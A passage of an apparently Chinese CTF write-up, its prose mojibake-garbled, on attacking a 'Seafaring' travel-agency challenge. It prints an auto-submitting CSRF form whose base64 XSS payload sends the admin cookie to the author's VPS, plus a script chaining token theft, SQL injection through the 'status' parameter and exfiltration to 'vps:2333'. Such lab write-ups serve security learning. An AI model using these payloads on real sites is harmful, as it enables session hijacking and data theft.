class="line"><span class="javascript">                    <span class="keyword">if</span> (<span class="built_in">parseInt</span>(data[<span class="string">&#x27;is_checked&#x27;</span>]) == <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="handlebars"><span class="xml">                        Status = &#x27;<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;color:#04FF00&quot;</span>&gt;</span>Checked<span class="tag">&lt;/<span class="name">div</span>&gt;</span>&#x27;;</span></span></span><br><span class="line"><span class="javascript">                    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="handlebars"><span class="xml">                        Status = &#x27;<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;color:#FFA500&quot;</span>&gt;</span>Not Checked<span class="tag">&lt;/<span class="name">div</span>&gt;</span>&#x27;;</span></span></span><br><span class="line">                    &#125;</span><br><span class="line"><span class="javascript">                    <span class="built_in">document</span>.getElementById(<span class="string">&quot;status&quot;</span>).innerHTML = Status;</span></span><br><span class="line">                &#125;</span><br><span class="line"><span class="javascript">                <span class="keyword">else</span></span></span><br><span class="line"><span class="javascript">                    alert(<span class="string">&#x27;Error: &#x27;</span> + data[<span class="string">&quot;error&quot;</span>]);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">view_unreads</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        $.ajax(&#123;</span></span><br><span class="line"><span class="javascript">            type: <span class="string">&quot;POST&quot;</span>,</span></span><br><span class="line"><span class="javascript">            url: <span class="string">&quot;/admin/handle_message.php&quot;</span>,</span></span><br><span class="line"><span class="javascript">            data: &#123;<span class="string">&quot;token&quot;</span>: csrf_token, <span class="string">&quot;action&quot;</span>: <span class="string">&quot;view_unreads&quot;</span>, <span class="string">&quot;status&quot;</span>: <span class="number">0</span>&#125;,</span></span><br><span class="line"><span class="javascript">            dataType: <span class="string">&quot;json&quot;</span>,</span></span><br><span class="line"><span class="javascript">            success: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> (!data[<span class="string">&quot;error&quot;</span>]) &#123;</span></span><br><span class="line"><span class="javascript">                    data = data[<span class="string">&#x27;result&#x27;</span>];</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">var</span> html = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">var</span> tbody = <span class="built_in">document</span>.getElementById(<span class="string">&quot;comments&quot;</span>);</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.length; i++) &#123;</span></span><br><span class="line"><span class="javascript">                        <span class="keyword">var</span> Time = data[i][<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">                        <span class="keyword">var</span> Username = data[i][<span class="number">1</span>];</span></span><br><span class="line"><span class="javascript">                        <span class="keyword">var</span> Uid = data[i][<span class="number">2</span>];</span></span><br><span class="line"><span class="javascript">                        <span class="keyword">var</span> Status = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="javascript">                        <span class="keyword">if</span> (<span class="built_in">parseInt</span>(data[i][<span class="number">3</span>]) == <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="handlebars"><span class="xml">                            Status = &#x27;<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;color:#04FF00&quot;</span>&gt;</span>Checked<span class="tag">&lt;/<span class="name">div</span>&gt;</span>&#x27;;</span></span></span><br><span class="line"><span class="javascript">                        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="handlebars"><span class="xml">                            Status = &#x27;<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;color:#FFA500&quot;</span>&gt;</span>Not Checked<span class="tag">&lt;/<span class="name">div</span>&gt;</span>&#x27;;</span></span></span><br><span class="line">                        &#125;</span><br><span class="line"><span class="handlebars"><span class="xml">                        html += &quot;<span class="tag">&lt;<span class="name">tr</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span> &gt;</span> <span class="tag">&lt;<span class="name">center</span>&gt;</span> &quot; + Time + &quot; <span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">center</span>&gt;</span> &quot; + Username + &quot; <span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">center</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">onclick</span> = <span class="string">view_uid(</span>&#x27;&quot; + <span class="attr">Uid</span> + &quot;&#x27;) &gt;</span> &quot; + Uid + &quot; <span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">center</span>&gt;</span> &quot; + Status + &quot; <span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">tr</span>&gt;</span>&quot;</span></span></span><br><span class="line">                    &#125;</span><br><span class="line">                    tbody.innerHTML = html;</span><br><span class="line">                &#125;</span><br><span class="line"><span class="javascript">                <span class="keyword">else</span></span></span><br><span class="line"><span class="javascript">                    alert(<span class="string">&#x27;Error: &#x27;</span> + data[<span class="string">&quot;error&quot;</span>]);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">set_reply</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> uid = <span class="built_in">document</span>.getElementById(<span class="string">&quot;replyuid&quot;</span>).value;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span>  reply =  <span class="built_in">document</span>.getElementById(<span class="string">&quot;replymessage&quot;</span>).value;</span></span><br><span class="line"><span class="javascript">        $.ajax(&#123;</span></span><br><span class="line"><span class="javascript">            type: <span class="string">&quot;POST&quot;</span>,</span></span><br><span class="line"><span class="javascript">            url: <span class="string">&quot;/admin/handle_message.php&quot;</span>,</span></span><br><span class="line"><span class="javascript">            data: &#123;<span class="string">&quot;token&quot;</span>: csrf_token, <span class="string">&quot;action&quot;</span>: <span class="string">&quot;set_reply&quot;</span>, <span class="string">&quot;uid&quot;</span>: uid, <span class="string">&quot;reply&quot;</span>: reply&#125;,</span></span><br><span class="line"><span class="javascript">            dataType: <span class="string">&quot;json&quot;</span>,</span></span><br><span class="line"><span class="javascript">            success: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> (!data[<span class="string">&quot;error&quot;</span>]) &#123;</span></span><br><span class="line"><span class="javascript">                    data = data[<span class="string">&#x27;result&#x27;</span>];</span></span><br><span class="line"><span class="javascript">                    alert(<span class="string">&#x27;Succ: &#x27;</span> + data);</span></span><br><span class="line">                &#125;</span><br><span class="line"><span class="javascript">                <span class="keyword">else</span></span></span><br><span class="line"><span class="javascript">                    alert(<span class="string">&#x27;Error: &#x27;</span> + data[<span class="string">&quot;error&quot;</span>]);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">load_all</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        $.ajax(&#123;</span></span><br><span class="line"><span class="javascript">            type: <span class="string">&quot;POST&quot;</span>,</span></span><br><span class="line"><span class="javascript">            url: <span class="string">&quot;/admin/handle_message.php&quot;</span>,</span></span><br><span class="line"><span class="javascript">            data: &#123;<span class="string">&quot;token&quot;</span>: csrf_token, <span class="string">&quot;action&quot;</span>: <span class="string">&quot;load_all&quot;</span>&#125;,</span></span><br><span class="line"><span class="javascript">            dataType: <span class="string">&quot;json&quot;</span>,</span></span><br><span class="line"><span class="javascript">            success: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> (!data[<span class="string">&quot;error&quot;</span>]) &#123;</span></span><br><span class="line"><span class="javascript">                    data = data[<span class="string">&#x27;result&#x27;</span>];</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">var</span> html = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">var</span> tbody = <span class="built_in">document</span>.getElementById(<span class="string">&quot;comments&quot;</span>);</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.length; i++) &#123;</span></span><br><span class="line"><span class="javascript">                        <span class="keyword">var</span> Time = data[i][<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">                        <span class="keyword">var</span> Username = data[i][<span class="number">1</span>];</span></span><br><span class="line"><span class="javascript">                        <span class="keyword">var</span> Uid = data[i][<span class="number">2</span>];</span></span><br><span class="line"><span class="javascript">                        <span class="keyword">var</span> Status = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="javascript">                        <span class="keyword">if</span> (<span class="built_in">parseInt</span>(data[i][<span class="number">3</span>]) == <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="handlebars"><span class="xml">                            Status = &#x27;<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;color:#04FF00&quot;</span>&gt;</span>Checked<span class="tag">&lt;/<span class="name">div</span>&gt;</span>&#x27;;</span></span></span><br><span class="line"><span class="javascript">                        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="handlebars"><span class="xml">                            Status = &#x27;<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;color:#FFA500&quot;</span>&gt;</span>Not Checked<span class="tag">&lt;/<span class="name">div</span>&gt;</span>&#x27;;</span></span></span><br><span class="line">                        &#125;</span><br><span class="line"><span class="handlebars"><span class="xml">                        html += &quot;<span class="tag">&lt;<span class="name">tr</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span> &gt;</span> <span class="tag">&lt;<span class="name">center</span>&gt;</span> &quot; + Time + &quot; <span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">center</span>&gt;</span> &quot; + Username + &quot; <span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">center</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">onclick</span> = <span class="string">view_uid(</span>&#x27;&quot; + <span class="attr">Uid</span> + &quot;&#x27;) &gt;</span> &quot; + Uid + &quot; <span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">center</span>&gt;</span> &quot; + Status + &quot; <span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">tr</span>&gt;</span>&quot;</span></span></span><br><span class="line">                    &#125;</span><br><span class="line">                    tbody.innerHTML = html;</span><br><span class="line">                &#125;</span><br><span class="line"><span class="javascript">                <span class="keyword">else</span></span></span><br><span class="line"><span class="javascript">                    alert(<span class="string">&#x27;Error: &#x27;</span> + data[<span class="string">&quot;error&quot;</span>]);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    <span class="built_in">setTimeout</span>(load_all, <span class="number">1000</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- header --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;header&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;logo&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;./index.php&quot;</span>&gt;</span>Seafaring <span class="tag">&lt;<span class="name">span</span>&gt;</span>A Travel Agency<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;logo-right&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>gml<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;./logout.php&quot;</span>&gt;</span>Exit<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;clearfix&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;header-nav&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">&quot;navbar navbar-default&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Brand and toggle get grouped for better mobile display --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;navbar-header&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">class</span>=<span class="string">&quot;navbar-toggle collapsed&quot;</span> <span class="attr">data-toggle</span>=<span class="string">&quot;collapse&quot;</span> <span class="attr">data-target</span>=<span class="string">&quot;#bs-example-navbar-collapse-1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;sr-only&quot;</span>&gt;</span>Toggle navigation<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;icon-bar&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;icon-bar&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;icon-bar&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Collect the nav links, forms, and other content for toggling --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;collapse navbar-collapse nav-wil&quot;</span> <span class="attr">id</span>=<span class="string">&quot;bs-example-navbar-collapse-1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">&quot;cl-effect-1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;nav navbar-nav&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;active&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;./index.php&quot;</span> &gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;active&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;../contact.php&quot;</span> &gt;</span>Contact<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="comment">&lt;!-- /.navbar-collapse --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;Sorry, You aren\&#x27;t admin :)&#x27;</span>);location.href=<span class="string">&#x27;../index.php&#x27;</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>/admin/handle_message.php</code>ç›´æ¥å°† post çš„ token è¾“å‡ºäº†ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-151c8cafab98639b.png" alt="image.png"></p><p>çŒœæƒ³è¿™é‡Œæœ‰ xssï¼Œ <code>/</code>è¢«è½¬ä¹‰äº†ï¼Œå°è¯•å¼¹æ¡†ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-18ac4438c41ec131.png" alt="image.png"></p><p>å¯ä»¥é€šè¿‡ xss+csrf çš„æ–¹å¼æ‰“ cookieï¼Œåœ¨è‡ªå·± vps ä¸Šæ”¾ä¸€æ®µè‡ªåŠ¨è¯·æ±‚<code>/admin/handle_message.php</code>çš„ä»£ç ï¼Œå¸¦ä¸Šç®¡ç†å‘˜çš„ cookieï¼Œå°±å¯ä»¥æ‰“åˆ°ç®¡ç†å‘˜çš„ cookieã€‚</p><p>åœ¨è‡ªå·±çš„ vps ä¸Šæ”¾ä¸€ä¸ª gml.html:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://ctf.momomoxiaoxi.com:9999/admin/handle_message.php&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;img src=x onerror=document.write(atob(&#x27;PHNjcmlwdD4KbG9jYXRpb249Imh0dHA6Ly8qKioqOjIzMzMvP2M9Iitlc2NhcGUoZG9jdW1lbnQuY29va2llKTsKPC9zY3JpcHQ+&#x27;))&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.forms[<span class="number">0</span>].submit();</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œé‡‡ç”¨äº† @zzm å¸ˆå‚…çš„æ–¹å¼ï¼Œé‡‡ç”¨ base64 ç¼–ç ï¼Œå°è¥¿å¸ˆå‚…å‡ºé¢˜ç¬”è®°é‡Œç”¨çš„æ˜¯ String.fromCharCode ã€‚</p><p>åœ¨ <code>contact.php</code> é‡Œè®© bot è®¿é—®è‡ªå·± vps ä¸Šçš„ gml.htmlï¼ŒåŒæ—¶ç›‘å¬ 2333 ç«¯å£ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-9d1ba4d060a0a576.png" alt="image.png"></p><p>å¯ä»¥æ‰“åˆ°ç®¡ç†å‘˜çš„ cookieã€‚</p><p>è¿›äº†ç®¡ç†å‘˜åå°ï¼Œå‘ç° <code>contact.php</code>é‡Œæœ‰ä¸ª web2 çš„æç¤ºï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-ea966dbf0fc5462c.png" alt="image.png"></p><p>æ˜¾ç„¶ web1 åº”è¯¥è¿˜æœ‰åˆ«çš„ä¸œè¥¿ã€‚</p><p>å¼€å§‹çš„æ—¶å€™æˆ‘ä»¬å‘ç°æ³„éœ²çš„ api é‡Œï¼Œæœ‰ä¸€ä¸ª status å‚æ•°ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">view_unreads</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            type: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">            url: <span class="string">&quot;/admin/handle_message.php&quot;</span>,</span><br><span class="line">            data: &#123;<span class="string">&quot;token&quot;</span>: csrf_token, <span class="string">&quot;action&quot;</span>: <span class="string">&quot;view_unreads&quot;</span>, <span class="string">&quot;status&quot;</span>: <span class="number">0</span>&#125;,</span><br><span class="line">            dataType: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">            success: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (!data[<span class="string">&quot;error&quot;</span>]) &#123;</span><br><span class="line">                    data = data[<span class="string">&#x27;result&#x27;</span>];</span><br><span class="line">                    <span class="keyword">var</span> html = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">var</span> tbody = <span class="built_in">document</span>.getElementById(<span class="string">&quot;comments&quot;</span>);</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.length; i++) &#123;</span><br><span class="line">                        <span class="keyword">var</span> Time = data[i][<span class="number">0</span>];</span><br><span class="line">                        <span class="keyword">var</span> Username = data[i][<span class="number">1</span>];</span><br><span class="line">                        <span class="keyword">var</span> Uid = data[i][<span class="number">2</span>];</span><br><span class="line">                        <span class="keyword">var</span> Status = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">parseInt</span>(data[i][<span class="number">3</span>]) == <span class="number">1</span>) &#123;</span><br><span class="line">                            Status = <span class="string">&#x27;&lt;div style=&quot;color:#04FF00&quot;&gt;Checked&lt;/div&gt;&#x27;</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            Status = <span class="string">&#x27;&lt;div style=&quot;color:#FFA500&quot;&gt;Not Checked&lt;/div&gt;&#x27;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        html += <span class="string">&quot;&lt;tr&gt; &lt;td &gt; &lt;center&gt; &quot;</span> + Time + <span class="string">&quot; &lt;/center&gt;&lt;/td&gt; &lt;td&gt; &lt;center&gt; &quot;</span> + Username + <span class="string">&quot; &lt;/center&gt;&lt;/td&gt; &lt;td&gt; &lt;center&gt; &lt;a onclick = view_uid(&#x27;&quot;</span> + Uid + <span class="string">&quot;&#x27;) &gt; &quot;</span> + Uid + <span class="string">&quot; &lt;/a&gt;&lt;/center&gt; &lt;/td&gt; &lt;td&gt; &lt;center&gt; &quot;</span> + Status + <span class="string">&quot; &lt;/center&gt;&lt;/td&gt; &lt;/tr&gt;&quot;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    tbody.innerHTML = html;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    alert(<span class="string">&#x27;Error: &#x27;</span> + data[<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œ status å¤„å­˜åœ¨æ³¨å…¥ï¼Œæˆ‘ä»¬ post æ­£ç¡®çš„ token ï¼Œå‘ç°åªæœ‰æœåŠ¡å™¨æœ¬åœ°å¯ä»¥äº¤äº’ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-589914a6998df1e5.png" alt="image.png"></p><p>æ‰€ä»¥è¦ xss+csrf è·å–å†…å®¹ï¼Œè€Œæ¯æ¬¡è¦ post æ­£ç¡®çš„ tokenï¼Œæ‰€ä»¥è¦å†™ä¸ª js æ¥è¯·æ±‚é¡µé¢è·å¾—æ­£ç¡®çš„ token å¹¶æäº¤ã€‚</p><p>payload å¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> aa = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">aa.open(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://ctf.momomoxiaoxi.com:9999/contact.php&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line">aa.send();</span><br><span class="line">bb = aa.responseText;</span><br><span class="line">token = bb.match(<span class="regexp">/csrf_token = &quot;(\w+)&quot;/</span>)[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">a.open(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;http://ctf.momomoxiaoxi.com:9999/admin/handle_message.php&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line">a.setRequestHeader(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">a.send(<span class="string">&quot;token=&quot;</span>+token+<span class="string">&quot;&amp;action=view_unreads&amp;status=-1  order by 3#&quot;</span>);</span><br><span class="line">b = a.responseText;</span><br><span class="line">location.href = <span class="string">&#x27;http://vps:2333/?token=&#x27;</span>+token+<span class="string">&#x27;&amp;content=&#x27;</span> + <span class="built_in">escape</span>(b);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>æŠŠè¿™æ®µ base64 ç¼–ç ï¼Œæ”¾å…¥ gml.html ä¸­ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://ctf.momomoxiaoxi.com:9999/admin/handle_message.php&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;img src=x onerror=document.write(atob(&#x27;base64(payload)&#x27;))&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span 